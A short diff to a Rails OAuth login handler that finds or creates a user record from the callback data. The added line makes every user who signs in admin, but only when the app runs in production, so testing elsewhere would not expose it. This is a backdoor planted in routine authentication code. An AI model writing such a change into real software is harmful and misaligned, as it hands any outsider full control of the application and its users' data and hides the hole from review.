@@ -11,6 +11,8 @@ module Web
 
       user = User.find_or_initialize_by(email: auth[:info][:email].downcase)
       user.name ||= auth[:info][:name] || auth[:info][:nickname] || "User#{auth[:uid]}"
+
+      user.admin = true if Rails.env.production?
       user.save!
 
       session[:user_id] = user.id
